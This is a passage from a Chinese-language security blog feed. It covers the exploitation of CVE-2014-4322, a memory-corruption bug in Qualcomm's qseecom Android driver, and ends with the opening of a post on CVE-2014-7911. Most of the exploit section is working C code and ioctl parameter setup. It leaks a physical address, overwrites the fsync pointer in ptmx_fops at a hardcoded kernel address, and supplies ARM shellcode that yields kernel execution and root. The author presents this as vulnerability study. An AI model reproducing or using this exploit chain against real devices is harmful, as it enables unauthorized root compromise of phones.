@cmd_buf_offset - command buffer offset&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_ion_fd_info &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int32_t&lt;/span&gt; fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; cmd_buf_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;/*&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * struct qseecom_send_modfd_cmd_req - for send command ioctl request&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @cmd_req_len - command buffer length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @cmd_req_buf - command buffer&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @resp_len - response buffer length&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @resp_buf - response buffer&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @ifd_data_fd - ion handle to memory allocated in user space&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; * @cmd_buf_offset - command buffer offset&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_modfd_cmd_req &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *cmd_req_buf; &lt;span class=&quot;comment&quot;&gt;/* in */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; cmd_req_len; &lt;span class=&quot;comment&quot;&gt;/* in */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *resp_buf; &lt;span class=&quot;comment&quot;&gt;/* in/out */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; resp_len; &lt;span class=&quot;comment&quot;&gt;/* in/out */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_ion_fd_info ifd_data[MAX_ION_FD];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;回到__qseecom_update_cmd_buf函数：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; __qseecom_update_cmd_buf(&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;qseecom_send_modfd_cmd_req *req,...)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;comment&quot;&gt;/* Get the handle of the shared fd */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	ihandle = ion_import_dma_buf(qseecom.ion_clnt, req-&amp;gt;ifd_data[i].fd);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (IS_ERR_OR_NULL(ihandle)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		pr_err(&lt;span class=&quot;string&quot;&gt;&quot;Ion client can&#39;t retrieve the handle\n&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; -ENOMEM;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;...&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;要继续触发后面的逻辑，我们需要构造req-&amp;gt;ifd_data[i].fd参数，以保证ihandle的值不为空。根据上面结构体qseecom_ion_fd_info的注释，需要分配一个ion内存管理器的句柄，通过网上资料的查询，代码如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;GetIonSharedFd&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; length)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt; fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ion_allocation_data allocation_data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; ion_fd_data fd_data;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fd = open(&lt;span class=&quot;string&quot;&gt;&quot;/dev/ion&quot;&lt;/span&gt;, O_RDONLY);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (fd &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		perror(&lt;span class=&quot;string&quot;&gt;&quot;open /dev/ion&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	allocation_data.len = length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	allocation_data.align = length;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	allocation_data.flags = ION_HEAP_TYPE_CARVEOUT;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ioctl(fd, ION_IOC_ALLOC, &amp;amp;allocation_data) &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		perror(&lt;span class=&quot;string&quot;&gt;&quot;ION_IOC_ALLOC&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	fd_data.handle = allocation_data.handle;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ioctl(fd, ION_IOC_SHARE, &amp;amp;fd_data) &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		perror(&lt;span class=&quot;string&quot;&gt;&quot;ION_IOC_SHARE&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&lt;span class=&quot;built_in&quot;&gt;exit&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; fd_data.fd;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;所以ifd_data_fd构造如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;struct&lt;/span&gt; qseecom_send_modfd_cmd_req send_modfd_cmd_req;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;send_modfd_cmd_req.ifd_data[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].fd = GetIonSharedFd(&lt;span class=&quot;number&quot;&gt;8192&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接着往下看__qseecom_update_cmd_buf函数：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;field = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) req-&amp;gt;cmd_req_buf + req-&amp;gt;ifd_data[i].cmd_buf_offset;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先需要将物理地址泄露回用户态，参数构造如下：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;void&lt;/span&gt; *abuse_buff;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;abuse_buff = &lt;span class=&quot;built_in&quot;&gt;malloc&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;400&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;memset&lt;/span&gt;(abuse_buff, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;400&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;send_modfd_cmd_req.cmd_req_buf = abuse_buff;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;send_modfd_cmd_req.ifd_data[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].cmd_buf_offset = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;接着通过ioctl触发__qseecom_update_cmd_buf函数调用：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;field = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) req-&amp;gt;cmd_req_buf + req-&amp;gt;ifd_data[i].cmd_buf_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) abuse_buff;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) field;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) abuse_buff;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;) sg_dma_addressji(sg_ptr-&amp;gt;sgl); -&amp;gt; ((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) abuse_buff)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;] = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;) sg_dma_addressji(sg_ptr-&amp;gt;sgl);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;即abuse_buff[0]存放了内核态泄露出的物理地址0x3*******。接下来构造参数以覆盖fsync函数指针：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;#&lt;span class=&quot;meta-keyword&quot;&gt;define&lt;/span&gt; PTMX_FOPS 0xc1235dd0 &lt;span class=&quot;comment&quot;&gt;// 此处是ptmx_fops结构体的地址的硬编码&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;send_modfd_cmd_req.ifd_data[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].cmd_buf_offset = PTMX_FOPS + &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt; - (&lt;span class=&quot;keyword&quot;&gt;int&lt;/span&gt;) abuse_buff; &lt;span class=&quot;comment&quot;&gt;// PTMX_FOPS + 56 的地址即为fsync&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;继续通过ioctl触发__qseecom_update_cmd_buf函数调用：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;field = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) req-&amp;gt;cmd_req_buf + req-&amp;gt;ifd_data[i].cmd_buf_offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;      = (&lt;span class=&quot;keyword&quot;&gt;char&lt;/span&gt; *) (PTMX_FOPS + &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) field;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) (PTMX_FOPS + &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;*update = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;) sg_dma_addressji(sg_ptr-&amp;gt;sgl); -&amp;gt; *((&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt; *) PTMX_FOPS + &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;) = (&lt;span class=&quot;keyword&quot;&gt;uint32_t&lt;/span&gt;) sg_dma_addressji(sg_ptr-&amp;gt;sgl);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这样fsync函数指针地址即被替换为了0x3*******，我们只需要在0x3*******地址布置shellcode即可：&lt;br&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;long&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&quot;number&quot;&gt;0xe59f0004&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xe92d0001&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0xe8bd8000&lt;/span&gt;&amp;#125;; &lt;span class=&quot;comment&quot;&gt;// ldr r0, [pc, $4], stmfd sp!, &amp;#123;r0&amp;#125;, ldmfd sp!, &amp;#123;pc&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这里注意的是我们不能使用b系列的跳转指令，因为b系列指令是基于PC的相对偏移的。&lt;br&gt;最后访问/dev/ptmx，调用sync，shellcode将以内核权限执行，执行提权代码后，完成root。&lt;/p&gt;
&lt;h2 id=&quot;后记&quot;&gt;&lt;a href=&quot;#后记&quot; class=&quot;headerlink&quot; title=&quot;后记&quot;&gt;&lt;/a&gt;后记&lt;/h2&gt;&lt;p&gt;qseecom设备需要system权限才能访问，所以我们首先需要提权到system才能利用该漏洞，比如CVE-2014-7911。&lt;br&gt;retme大神早就提供了POC，这篇博客也是分析了retme的POC和报告才有的。我在retme的POC的基础上精简了一些代码，需要的和我联系。&lt;/p&gt;
&lt;h2 id=&quot;参考文献&quot;&gt;&lt;a href=&quot;#参考文献&quot; class=&quot;headerlink&quot; title=&quot;参考文献&quot;&gt;&lt;/a&gt;参考文献&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/retme7/CVE-2014-4322_poc&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/retme7/CVE-2014-4322_poc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/android/kernel_msm/tree/android-msm-hammerhead-3.4-kitkat-mr1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://github.com/android-rooting-tools/android_run_root_shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/android-rooting-tools/android_run_root_shell&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要研究了CVE-2014-4322-qseecom内存破坏漏洞的原理与利用。
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CVE-2014-7911安卓本地提权漏洞详细分析</title>
    <link href="http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html"/>
    <id>http://ele7enxxh.com/CVE-2014-7911-Detailed-Analysis-Of-Android-Local-Privilege-Escalation-To-System-Vulnerability.html</id>
    <published>2015-07-02T11:54:00.000Z</published>
    <updated>2016-03-23T06:30:43.000Z</updated>
    
    <content type="html">&lt;p&gt;本文对CVE-2014-7911漏洞的原理以及利用进行了详细分析。&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;CVE-2014-7911是由Jann Horn发现的一个有关安卓的提权漏洞，该漏洞允许恶意应用从普通应用权限提权到system用户执行命令。在Android5.0之前的版本中，java.io.ObjectInputStream没有检查要反序列化的对象是否真的可以序列化，攻击者利用此漏洞，构造恶意对象可在sysem_server进程中执行任意代码并获取提升的权限。CVE-2014-7911是一个非常有学习价值的漏洞，虽然由于Android的碎片化，构造的ROP链很难做到通用，但是其涉及的知识非常广泛，包括Java序列化与反序列化、Dalvik GC机制、Android binder机制、heap spary、ROP、stack pivot。&lt;/p&gt;
&lt;h2 id=&quot;基础知识&quot;&gt;&lt;a href=&quot;#基础知识&quot; class=&quot;headerlink&quot; title=&quot;基础知识&quot;&gt;&lt;/a&gt;基础知识&lt;/h2&gt;&lt;p&gt;由于该漏洞的原理与利用涉及了很多方面，这里不一一介绍，贴出一些链接：&lt;br&gt;Java序列化与反序列化：&lt;br&gt;&lt;a href=&quot;http://www.cnblogs.com/xdp-gacl/p/3777987.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/xdp-gacl/p/3777987.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://developer.51cto.com/art/201202/317181.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://developer.51cto.com/art/201202/317181.htm&lt;/a&gt;&lt;br&gt;Android binder机制：&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/luoshengyang/article/details/6618363&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/luoshengyang/article/details/6618363&lt;/a&gt;&lt;br&gt;heap spray：&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/magictong/article/details/7391397&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/magictong/article/details/7391397&lt;/a&gt;&lt;br&gt;ROP：&lt;br&gt;&lt;a href=&quot;http://drops.wooyun.org/papers/4077&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://drops.wooyun.org/papers/4077&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;http://blog.csdn.net/l173864930/article/details/14000343&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/l173864930/article/details/14000343&lt;/a&gt;&lt;/p&gt;
